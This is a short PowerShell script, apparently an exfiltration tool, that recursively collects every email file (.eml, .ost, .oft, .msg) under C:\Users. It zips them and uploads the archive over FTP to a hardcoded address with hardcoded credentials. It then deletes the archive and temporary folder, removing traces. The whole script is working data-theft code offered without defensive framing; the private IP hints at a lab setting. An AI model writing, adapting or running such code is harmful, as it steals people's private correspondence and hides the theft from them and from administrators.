$check = Get-ChildItem -Path C:\Users -include ('*.eml', '*.ost', '*.oft', '*.msg') -recurse
if ( $check.length -eq 0 ) {
    exit
    } Else {
    $user = $env:username
    $dir = $env:temp + "\$user"
    New-Item $dir -ItemType directory | Out-Null
    Get-ChildItem -ErrorAction SilentlyContinue -Path C:\Users -include ('*.eml', '*.ost', '*.oft', '*.msg') -recurse | foreach-object {copy-item $_ -destination $dir}
    Compress-Archive -Path $dir\ -DestinationPath "files.zip" | Out-Null

    $FTPRequest = [System.Net.FtpWebRequest]::Create("ftp://192.168.1.207/$user")
    $FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
    $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $FTPRequest.Credentials = new-object System.Net.NetworkCredential("ftpuser", "ftpuser")
    $FTPRequest.UseBinary = $true
    $FTPRequest.UsePassive = $true
    $FileContent = gc -en byte "files.zip"
    $FTPRequest.ContentLength = $FileContent.Length

    $Run = $FTPRequest.GetRequestStream()
    $Run.Write($FileContent, 0, $FileContent.Length)
    $Run.Close()
    $Run.Dispose()

    Remove-Item files.zip
    Remove-Item -LiteralPath $dir -Force -Recurse
}

